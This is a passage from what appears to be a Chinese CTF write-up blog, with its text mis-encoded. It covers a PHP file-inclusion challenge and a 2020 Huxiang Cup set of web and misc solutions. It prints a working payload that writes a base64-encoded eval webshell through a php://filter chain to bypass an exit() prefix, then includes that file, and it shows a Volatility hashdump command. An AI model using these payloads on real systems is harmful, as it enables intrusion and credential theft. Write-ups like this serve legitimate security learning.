<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>Home<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/bootstrap.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Custom Theme files --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--theme-style--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--//theme-style--></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>application/x-javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">setTimeout</span><span class="token punctuation">(</span>hideURLbar<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">hideURLbar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            window<span class="token punctuation">.</span><span class="token function">scrollTo</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>

    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://fonts.googleapis.com/css?family<span class="token punctuation">=</span>Muli:400,300<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>http://fonts.googleapis.com/css?family<span class="token punctuation">=</span>Oswald<span class="token punctuation">'</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>stylesheet<span class="token punctuation">'</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text/css<span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- animation-effect --></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/wow.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
        <span class="token keyword">new</span> <span class="token class-name">WOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- //animation-effect --></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
    <span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span> <span class="token variable">$page</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre>
<p>ç„¶åå»è¯»æºç é‡Œæç¤ºçš„æ–‡ä»¶ï¼Œå¾—åˆ°ï¼š</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/www/html/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"Here is your sandbox: "</span><span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php exit();'</span> <span class="token punctuation">.</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>payload:</p>
<pre><code>http://eci-2zecngytg1no58dxm6mu.cloudeci1.ichunqiu.com/7fa3b767c460b54a2be4d49030b349c7.php?content=php://filter/write=string.strip_tags/?%3EPD9waHAgZXZhbCgkX1JFUVVFU1RbJ0EnXSk7cGhwaW5mbygpOw%3D%3D%3C?123456/resource=2.php</code></pre><p>å†™å…¥base64ç¼–ç çš„payloadç„¶ååˆ©ç”¨ä¹‹å‰çš„æ–‡ä»¶åŒ…å«çš„ç‚¹å»base64è§£ç åŒ…å«æ¥ç»•è¿‡æ­»äº¡exitã€‚</p>
<p>ç„¶åç”¨ä¹‹å‰çš„æ–‡ä»¶åŒ…å«å»åŒ…å«ï¼š</p>
<pre><code>http://eci-2zecngytg1no58dxm6mu.cloudeci1.ichunqiu.com/index.php?page=php://filter/read=convert.base64-decode/resource=sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/aa.php</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91wp/16035911807851.jpg" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020æ¹–æ¹˜æ¯WP</title>
    <url>/2020/11/01/hu-xiang-bei-2020/</url>
    <content><![CDATA[<blockquote>
<p>å¹³å°å¡äº†ä¸€ä¸‹åˆåŠ ä¸€æ™šä¸Šå°±ç¦»è°±ï¼Œæœ€åå·®ä¸€ä¸ªé¢˜QAQ</p>
</blockquote>
<blockquote>
<p> éƒ¨åˆ†æ¯”èµ›é¢˜ç›®éƒ½å­˜äº†ä¸€ä»½æ‰“åŒ…ä¸Šä¼ äº†ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p>
<p> é“¾æ¥: <a href="https://pan.baidu.com/s/1kbzuWl44zkslzEGUSnc3aQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1kbzuWl44zkslzEGUSnc3aQ</a>  å¯†ç : iilt</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"><a href="#é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„" class="headerlink" title="é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„"></a>é¢˜ç›®åå­—ä¸é‡è¦åæ­£é¢˜æŒºç®€å•çš„</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web1.png" alt="å›¾ç‰‡"></p>
<h3 id="new-website"><a href="#new-website" class="headerlink" title="new website"></a>new website</h3><pre class=" language-plain"><code class="language-plain">ip: 47.111.96.55
port: 54900
protocol: http</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web2-1.png" alt="å›¾ç‰‡"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/web2-2.png" alt="å›¾ç‰‡"></p>
<p>24eaa438e7c1f0720823cf76d9c52f7d</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc1.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åå»è¿™ä¸ªç½‘ç«™è§£å¯†ï¼š</p>
<p><a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack</a></p>
<p>è§£å‡ºæ˜æ–‡ï¼šqwer1234</p>
<p>å†å»sha1</p>
<h3 id="é¢œæ–‡å­—"><a href="#é¢œæ–‡å­—" class="headerlink" title="é¢œæ–‡å­—"></a>é¢œæ–‡å­—</h3><p>ç»™äº†ä¸ªæµé‡åŒ…</p>
<p>æå–å‡ºhttpä¼ è¾“æ–‡ä»¶</p>
<p>å‘ç°æœ‰ä¸ªindex-demo.html</p>
<p>åœ¨æºç ä¸­å‘ç°å¤§é‡base64ç¼–ç </p>
<p>å†™ä¸ªè„šæœ¬è§£ç äº†ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š</p>
<pre class=" language-plain"><code class="language-plain">(ï½¡ï½¥âˆ€ï½¥)ï¾‰ï¾å—¨Hi~ 

(ï¼ _ï¼ ;)(ï¼ _ï¼ ;)(ï¼ _ï¼ ;)

(+_+)?(ã€‚>ï¸¿<)_Î¸(ã€‚>ï¸¿<)_Î¸

o(*ï¿£â–½ï¿£*)ãƒ–ã‚œ

ï¼œï¼ˆï¼¾ï¼ï¼¾ï¼‰ï¼(â•¯â–½â•° )å¥½é¦™~~

ãƒ½(âœ¿ï¾Ÿâ–½ï¾Ÿ)ãƒ(ï¼ ï¼¾ï¼ï¼¾)

(^^ã‚Î¨(ï¿£âˆ€ï¿£)Î¨*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)/$:*.Â°â˜…* ã€‚

~\(â‰§â–½â‰¦)/~o(^â–½^)o(Â¬â€¿Â¬)(*â‰§ï¸¶â‰¦))(ï¿£â–½ï¿£* )ã‚â”³â”â”³(â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”»

â”³â”â”³ ãƒ( ã‚œ-ã‚œãƒ)à² _à² 

à² _à² (â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—(Â¬_Â¬ )

(ãƒã¸ï¿£ã€)o(ï¿£â”°ï¿£*)ã‚â•°(è‰¹çš¿è‰¹ )ï¼ˆï¸¶^ï¸¶ï¼‰(* ï¿£ï¸¿ï¿£)(ï¿£Îµ(#ï¿£)

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(Â¬_Â¬")(ï¿£ï¹ï¿£ï¼›)(â•¯Â°â–¡Â°ï¼‰â•¯ï¸µ â”»â”â”»ãƒ½(ã‚œâ–½ã‚œ )ï¼C<(/;â—‡;)/~(ãƒ˜ï½¥_ï½¥)ãƒ˜â”³â”â”³

à² _à² (â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—(Â¬_Â¬ )

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒ

âŠ™ï¹âŠ™âˆ¥ãƒ½(*ã€‚>Ğ”<)oã‚œ/(ã„’oã„’)/~~(#_<-)ï¼ˆï¼äººï¼œï¼›ï¼‰

(ãƒã¸ï¿£ã€)o(ï¿£â”°ï¿£*)ã‚â•°(è‰¹çš¿è‰¹ )ï¼ˆï¸¶^ï¸¶ï¼‰(* ï¿£ï¸¿ï¿£)(ï¿£Îµ(#ï¿£)

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(ï¾ŸĞ”ï¾Ÿ*)ï¾‰â—‹|ï¿£|_ =3(ãƒï½€Ğ”)ãƒ(â€²Ğ´ï½€Ïƒ)Ïƒ(ï¿¢ï¸¿Ì«Ì¿ï¿¢â˜†)ï½( Tãƒ­T)Ïƒ<( â€µâ–¡â€²)>â”€â”€

(âŠ™ËâŠ™)ï¼Ÿ(Ïƒï½€Ğ´â€²)Ïƒ<( â€µâ–¡â€²)>â”€â”€â”€ï¼£Îµ(â”¬ï¹â”¬)3<( â€µâ–¡â€²)â”€â”€â”€Cï¼œâ”€___-)||ï½( Tãƒ­T)Ïƒ(ã€ƒï¼ç›®ï¼œ)

(oï¾Ÿvï¾Ÿ)ãƒd=====(ï¿£â–½ï¿£*)bÎµ=Îµ=Îµ=(~ï¿£â–½ï¿£)~(â¤ Ï‰ â¤)Uâ€¢ã‚§â€¢*U

(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢

(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢

(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢

(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢

flagè¢«æˆ‘ç‚¸æ²¡äº†å“ˆå“ˆå“ˆ</code></pre>
<p>ç„¶åå‘ç°è¿˜æœ‰ä¸ªbase64éšå†™ï¼Œå¾—åˆ°ï¼š</p>
<p>key:â€lorrieâ€</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc2-1.png" alt="å›¾ç‰‡"></p>
<pre class=" language-plain"><code class="language-plain">flag{â†’_â†’â†_â†â†_â†â†_â†â†_â† â†’_â†’â†’_â†’â†_â†â†_â†â†_â† â†’_â†’â†_â†â†_â†â†_â† â†_â†â†_â†â†_â†â†’_â†’â†’_â†’ â†_â†â†_â†â†_
â†â†’_â†’â†’_â†’ â†_â† â†_â†â†_â†â†_â†â†’_â†’â†’_â†’ â†’_â†’â†’_â†’â†’_â†’â†’_â†’â†_â† â†’_â†’â†_â†â†_â†â†_â† â†_â†â†_â†â†_â†â†_â†â†_â†
 â†_â†â†’_â†’â†’_â†’â†’_â†’â†’_â†’ â†’_â†’â†’_â†’â†’_â†’â†’_â†’â†’_â†’ â†_â†â†_â†â†_â†â†_â†â†_â† â†_â†â†_â†â†’_â†’â†_â† â†’_â†’â†_â†â†_â†â†
_â† â†_â†â†_â†â†_â†â†_â†â†’_â†’ â†_â†â†’_â†’ â†_â†â†_â†â†’_â†’â†’_â†’â†’_â†’ â†’_â†’â†’_â†’â†’_â†’â†’_â†’â†_â† â†_â†â†_â†â†_â†â†_â†â†_
â† â†_â†â†_â†â†_â†â†’_â†’â†’_â†’ â†_â†â†’_â†’ â†’_â†’â†’_â†’â†’_â†’â†’_â†’â†’_â†’ â†’_â†’â†_â†â†’_â†’â†_â† â†_â† â†’_â†’â†’_â†’â†_â†â†_â†â†_
â† â†’_â†’â†’_â†’â†’_â†’â†’_â†’â†_â† â†’_â†’â†_â†â†’_â†’â†_â† â†_â†â†_â†â†_â†â†’_â†’â†’_â†’ â†_â†â†_â†â†_â†â†’_â†’â†’_â†’ â†’_â†’â†’_â†’â†_â†
â†_â†â†_â† â†’_â†’â†’_â†’â†’_â†’â†_â†â†_â†}</code></pre>
<p>ç„¶åè«æ–¯<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc2-2.png" alt="å›¾ç‰‡"></p>
<h3 id="è™šå®ä¹‹é—´"><a href="#è™šå®ä¹‹é—´" class="headerlink" title="è™šå®ä¹‹é—´"></a>è™šå®ä¹‹é—´</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-1.png" alt="å›¾ç‰‡"></p>
<p>123%asd!O</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-2.png" alt="å›¾ç‰‡"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc3-2.png" alt="å›¾ç‰‡">))</p>
<p>flag{febc7d2138555b9ebccb32b554dbb11c}</p>
<h3 id="éšè—çš„ç§˜å¯†"><a href="#éšè—çš„ç§˜å¯†" class="headerlink" title="éšè—çš„ç§˜å¯†"></a>éšè—çš„ç§˜å¯†</h3><p>å‰é¢å¸¸è§„åˆ†æï¼Œè¿›ç¨‹å•¥çš„</p>
<p>ç„¶åå°±çœ‹æ–‡ä»¶</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-1.png" alt="å›¾ç‰‡">))</p>
<p>çœ‹åˆ°è¿™</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-2.png" alt="å›¾ç‰‡"></p>
<p>è¿˜æœ‰å±å¹•æˆªå›¾</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-3.png" alt="å›¾ç‰‡"></p>
<p>æå–<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-4.png" alt="å›¾ç‰‡"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-5.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åvol.py -f éšè—çš„ç§˜å¯†.vmem â€“profile=Win2003SP1x86 hashdump</p>
<p>æ‰¹é‡è§£å¯†ä¸€ä¸ªä¸€ä¸ªè¯•</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/misc4-6.jpg" alt="å›¾ç‰‡"></p>
